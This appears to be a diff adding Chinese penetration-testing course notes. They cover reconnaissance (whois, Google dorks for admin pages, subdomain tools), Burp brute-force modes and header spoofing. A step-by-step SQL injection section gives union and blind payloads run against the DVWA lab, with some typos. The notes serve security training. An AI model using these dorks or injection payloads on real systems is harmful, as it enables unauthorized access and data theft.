@@ -1,0 +1,336 @@
+
+信息收集
+
+1	Whois是用来查询域名的ip以及所有者等信息的传输协议。可查询域名是否被注册
+	
+	https://whois.aliyun.com
+	
+	https://www.whois365.com/cn
+	
+	https://whois.chinaz.com
+
+2	Whois的命令行查询
+
+	whois yijinglab.com(url)
+
+	python脚本查询
+	git clone https://gitee.com/yijingsec/yjtools
+	cd yjtools
+	python -m pip install -r requitements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
+
+3	Whois反查
+	https://whois.aizhan.com/reverse-whois/
+	
+	域名反差:https://whois.chinaz.com/batch
+	
+	邮箱反查:https://whois.chinaz.com/reverse/email
+	
+	注册人反查:https://whois.chinaz.com/reverse/register
+	
+	电话反查:https://whois.chinaz.com/reverse/phone
+
+3	备案信息
+	https://beian.miit.gov.cn/
+	https://icp.chinaz.com/
+
+4	
+
+
+子域名查找方式
+
+1	搜索引擎高级搜索
+	Google Hacking
+	https://www.exploit-db.com/google-hacking-database
+	
+intext		寻找正文中含有关键字的网页				intext:后台登陆				将只返回正文中包含“后台登陆”的网页
+intitle		寻找标题中含有关键字的网页				intitle:后台登陆			将只返回标题中包含“后台登录的网页，intitle：后台登录密码将返回标题中包含“后台登录“而正文中包含密码的网页
+allintitle	用法和intitle类似只不过可以指定多个词	alltitle：后台登录管理员	将返回标题中包含“后台登录”和“管理员”的网页
+inurl		将返回url中含有关键词的网页				inurl:Login					将返回ur1中含有Login的网页
+allinurl	用法和inurl类似，只不过可以指定多个词	allinurl:Login admin		将返回ur1中含有Login和admin的网页
+site		指定访问的站点							site:baidu.com inurl:Login	将只在baidu.com中查找url中含有Login的网页
+filetype	指定访问的文件类型						site:baidu.com filetype:pdf	将只返回baidu.com站点上文件类型为pdf的网页
+link		指定链接的网页							link:www.baidu.com			将返回所有包含指向www.baidu.com的网页
+related		相似类型的网页							related:www.xjtu.edu.cn		将返回与www.xjtu.edu.cn相似的页面，相似指的是网页的布局相似
+info		返回站点的指定信息						info:www.baidu.com			将返回百度的一些信息
+define		返回某个词语的定义						define:Hacker				将返回百度的一些信息
+cache		网页快照，谷歌将返回给你它存储下来的历史页面	cache:www.hackingspirits.com guest	将返回指定网站的缓存，并且正文中含有guest
+
+nurl://admin/login.php							查找管理员登录页面
+
+inurl:/phpmyadmin/index.php						查找后台数据库管理页面
+
+site:baidu.com inurl:Login						只在baidu.com中查找url中含有Login的网页
+
+site:baidu.com filetype:pdf						只返回baidu.com站点上文件类型为pdf的网页
+
+link:www.baidu.com								返回所有包含指向www.baidu.com的网页
+
+related:www.1lhc.edu.cn							返回与www.1lhc.edu.cn网页布局相似的页面
+
+site:xx.comintext:管理 site:xx.cominurl:login	查找网站后台
+site:xx.comintitle：后台
+
+site:xx.com filetype:php site:xx.com filetype:asp查看服务器使用的程序
+site:xx.com filetype:jsp site:xx.com filetype:aspx
+
+
+
+2	第三方接口（别人开发的一些子域名搜索网站）
+
+3	网络空间测绘工具(fofa)
+
+4	SSL证书查询
+
+5	JS源码泄露
+
+6	使用聚合工具(one for all)
+
+	原项目地址：https://github.com/shmilylty/OneForAll
+
+	gitee项目地址：https://gitee.com/yijingsec/OneForAll
+
+	教学地址
+	https://edu.yijinglab.com/post/295
+
+7	暴力破解工具（子域名挖掘机）
+
+暴力破解工具
+Subdomainsbrute
+subdomain3
+________________________
+端口信息收集
+
+1.IP信息收集
+
+http://stool.chinaz.com/same
+https://tools.ipip.net/ipdomain.php
+https://www.dnsgrep.cn/
+https://site.ip138.com/
+
+________________________
+
+nmap 扫描url不行 扫描域名可以
+
+url https://www.yijinglab.com
+域名 www.yijinglab.com
+
+________________________
+
+ping 的TTL=128 为windows
+ping 的TTL=64 则为linux
+
+________________________
+
+重放攻击漏洞
+
+弱口令漏洞（爆破）
+
+信息轰炸漏洞
+
+权限绕过漏洞
+
+密码找回漏洞
+
+信息泄漏漏洞
+
+API接口漏洞
+
+支付逻辑漏洞
+
+任务用户注册漏洞
+________________________
+
+漏洞认识与重攻击漏洞
+
+漏洞的认识
+	漏洞是计算机系统，网络，应用程序或者设备中的弱点和缺陷
+
+常见的安全漏洞
+
+1.SQL注入（SQL Injection）：常见的攻击方式，在Web应用程序的输入字段中插入恶意SQL代码，试图控制后段数据库
+
+2.跨站脚本攻击（XSS）：攻击者在网页上注入恶意脚本，当其他用户浏览该页面时，脚本会在用户的浏览器上执行，可能导致会话劫持，恶意软件分发等问题
+
+3.服务器请求伪造（SSRF）：攻击者构造请求让服务器执行，服务器对传回的请求未作特殊处理直接执行而造成的漏洞，可能导致攻击内网的Web应用，读取任意文件等
+
+4.XML外部实体注入（XXE）：应用程序解析XML输入时，没有禁止外部实体的加载，导致用户可以控制外部的加载文件
+
+5.跨站请求伪造（CSRF）：攻击者诱使用户在不知情的情况下执行网站的操作，比如转账或更改设置
+
+6.代码注入：攻击者能够控制代码生成的过程，导致恶意代码被执行
+
+7.不当权限管理：系统护照应用程序未能正确管理用户权限，导致未授权的访问或操作
+
+8.授权错误：系统未能正确实施访问控制，导致未经授权的用户能够访问或修改数据
+
+9.不受控制的资源消耗：攻击者可能会利用这一漏洞耗尽系统资源，导致拒绝服务（DoS）
+
+10.敏感信息泄漏：系统未能妥善保护敏感信息，导致信息泄漏给未经授权的行为者
+
+黑盒测试（渗透测试/攻击测试）
+
+白盒审计（代码审计/源代审计）
+
+SRC（安全应急响应中心）专门为企业提供漏洞提交和管理的平台
+
+0day是针对某个系统或者某个主键
+	eg	apache
+		WordPress
+
+重放攻击（重播攻击/回放攻击）：是指攻击者发送一个目的的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性
+
+________________________
+
+弱口令漏洞
+
+通常认为容易被人猜测到或者被破解工具破解的口令均为弱口令
+
+公共弱口令：常见密码，根据大量的密码数据统计得出的出现频率较高的弱口令
+条件弱口令：往往与这个人的个人信息有关
+
+爆破模式（burpSuite）
+
+模式名称		参数要求			字典配置规则				攻击次数计算
+Sniper			一个或者多个参数	所有参数共用一个字典		攻击次数=参数数量*字典条目数
+Battering ram	一个或多个参数		所有参数强制使用同一字典	字典条目数
+Pitchfork		需要>=两个参数		每个参数独立配置字典		最短字典的条目数
+Cluster bomb	需≥2个参数			每个参数独立配置字典		各字典条目数的笛卡尔积
+
+Sniper			已知用户名爆破密码（单变量测试）
+Battering ram 	测试用户名与密码相同的情况（如弱口令策略）
+Pitchfork		已知用户名与密码的对应关系（如CSV格式泄露数据）
+Cluster bomb	完全未知的用户名+密码组合穷举（高耗时场景）
+
+________________________
+
+Burp
+
+伪造IP
+X-Forwarded-For:IP
+
+________________________
+
+Referer: https://www.baidu.com
+HTTP 请求头中的一项
+它让服务器知道“你是从哪个页面点进来的”。
+
+________________________
+
+User-Agent:
+HTTP 请求头
+告诉服务器“我是哪个客户端（浏览器/设备/系统）”在访问你！
+_________________________
+
+SQL注入
+1 获取敏感数据：管理员账号，密码等
+2 绕过登陆验证：使用万能密码登陆网站后台等
+3 文件系统操作：列目录，读取，写入文件等
+4 注册表操作：	读写，写入，删除注册表等
+5 执行系统命令：远程执行命令
+
+注入位置分类
+GET注入
+POST注入
+Head头注入
+
+根据结果反馈分类：
+有回显注入（显错注入）
+无回显注入（盲注）
+
+根据数据类型分类：
+字符型注入：当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于 数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合
+数字型注入：当输入的参数为整型时，如ID，年龄，页码等，如果存在注入漏洞，则可以认为是数字型注入
+
+联合查询注入
+SQL中，union操作符用于合并两个或多个SELECT语句的结果。union查询注入利用UNION关键字可以追加一条或者多条额外的SELECT查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个SELECT语句的结果
+
+为了方便后续获取数据，需要先知道查询的表中显示的字段数，可以使用order by 来进行判断(1' order by 3%23) %23是注释符号 # 的URL编码 为了注释掉后面的'(# 是mysql中的注释符号 还有 --空格 ， /*...*/)
+
+确定显示位
+客户端将数据展示在页面中，这个展示数据的位置就叫显示位。
+union操作符号用于合并两个或者多个select语句的结果集，union结果集中的列名总是等于union中第一select语句中的列名，并且union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条select语句中的列的顺序必须相同
+
+确认显示位就可以获取数据库名
+在有回显的位置上将获取数据库名的函数进行替换
+-1' union select 1,database()%23
+输入-1'的原因是 让union左侧的指令不现实 让union右边的命令现实为第一行 所以一般用负数或者超级大的数让左侧的指令无效
+
+获取数据库中的表名
+-1' union select 1,table_name from information_schema.tbales where table_schema='dvwa'%23
+
+获取表中字段名
+-1' union select 1,column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa'%23
+
+获取表中记录
+-1' union select 1,comment from guestbook%23
+
+获取表中所有记录，可以用group_concat()合并成一行输入
+-1' union select 1,group_concat(comment_id,comment,name) from guestbook%23
+
+盲注就是sql注入过程中，sql语句执行后，查询到的数据不能回显到前端页面，此时我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
+
+注入流程
+1 	判断是否存在注入
+		一般使用" 1 and 1=1, 1 and 1=2, 1' and '1'=1, 1' and '1'='2 "进行判断
+2 	获取数据库长度
+		1' and length(database())<5%23
+3 	逐字猜解数据库名
+		1' and substr(database(),1,1)='d'%23
+		1' and substr(database(),2,1)='v'%23
+4 	猜解表名数量
+		1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2%23
+5 	猜解某个表名长度
+		1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9%23	
+		LENGTH(expr) 会返回字符串的 字节长度（不是字符个数，注意是字节！）。
+			SELECT LENGTH('abc');      -- 返回 3
+			SELECT LENGTH('你好');     -- 返回 6（因为每个汉字是 3 字节）
+		这是因为 SELECT ... 是一个 子查询，它返回的是一个值（table_name 字段），所以你必须 用括号把它包起来	
+		第一层括号是 LENGTH(...) 这个函数的参数。
+		第二层括号是把 SELECT ... 包起来，让它作为一个标量子查询（scalar subquery）。	所以需要两个括号
+		LIMIT offset, count
+		意思是：
+		从第 0 行开始（也就是第一行）
+		只取 1 条记录
+6 	逐字猜解表名
+		1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)='u'%23
+7	猜解列名数量
+		1' and (select count(column_name) from information_schema.columns where table_name="guestbook" and table_schema="dvwa")=3%23
+		1' and (select count(column_name) from information_schema.columns where table_name="users" and table_schema="dvwa")=8%23
+8	猜解某个列名长度
+		1' and length((select column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' limit 0,1))=10%23
+9	逐字猜解列名
+		1' and substr((select column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' limit 0,1),1,1)='c'%23
+		1' and substr((select column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' limit 0,1),2,1)='o'%23
+10	判断数据数量
+		1' and (select count(comment_id) from guestbook)=1%23
+11	猜解某条数据长度
+		1' and (select length(comment_id) from guestbook limit 0,1)=1%23
+12	逐位猜解数据
+		1' and substr((select comment_id from guestbook limit 0,1),1,1)='1'%23
+
+mysql的引号都是成双成对的
+
+MySQL 中的 隐式类型转换（Implicit Type Conversion） 是指在进行比较或运算时，MySQL 自动在不同数据类型之间转换，以完成表达式的求值。
+
+这虽然方便，但也可能导致性能问题、逻辑错误、甚至安全漏洞，所以理解它非常重要。
+
+SELECT 1 = '1';       -- 返回 TRUE，字符串 '1' 被转为数字
+SELECT 123 = '123abc'; -- 返回 TRUE，'123abc' 被转为数字 123
+
+MySQL 从字符串开头解析尽可能多的数字，非数字部分会被忽略。
+
+'123abc'会被转化为123
+'abc123'会变成0
+
+SELECT TRUE = 1;       -- TRUE
+SELECT FALSE = 0;      -- TRUE
+SELECT 'true' = TRUE;  -- 'true' 转换为 0，结果是 FALSE
+
+SELECT '2023-01-01' = DATE('2023-01-01');  -- TRUE
+MySQL 会尝试把字符串转换成日期或时间戳。
+__________________________
+
+
+
+
+
